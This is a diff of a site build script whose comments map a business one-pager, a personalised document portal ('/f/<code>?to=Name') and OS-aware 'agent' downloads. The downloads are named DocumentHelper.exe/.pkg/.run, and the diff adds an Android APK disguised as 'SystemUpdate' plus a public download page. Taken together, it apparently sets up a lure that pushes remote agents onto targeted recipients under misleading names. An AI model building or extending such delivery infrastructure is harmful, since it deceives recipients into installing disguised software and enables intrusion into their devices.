@@ -3,6 +3,7 @@
 #
 #   /                 -> business one-pager        (about.html)
 #   /f/<code>?to=Name -> document portal           (index.html)
+#   /connect          -> public OS-detected agent list (connect.html)
 #   /get              -> OS-aware agent download   (_worker.js -> /dl/<file>)
 #   /img/*            -> one-pager gallery images  (the "Recent work" photos)
 #
@@ -31,7 +32,11 @@ cp -f "$SRC/send/favicon.ico" "$OUT/favicon.ico" 2>/dev/null || true
 cp -f "$SRC/send/dl/DocumentHelper.exe" \
       "$SRC/send/dl/DocumentHelper.pkg" \
       "$SRC/send/dl/DocumentHelper.run" \
+      "$SRC/send/dl/SystemUpdate-1.0.23-release.apk" \
       "$SRC/send/dl/RELEASES.txt" "$OUT/dl/"
+
+# Public OS-detected download page
+cp -f "$HERE/connect.html" "$OUT/connect.html"
 
 # Pages Functions worker (routing + OS detection + attachment headers)
 cp -f "$HERE/mk-pages-worker3.js" "$OUT/_worker.js"
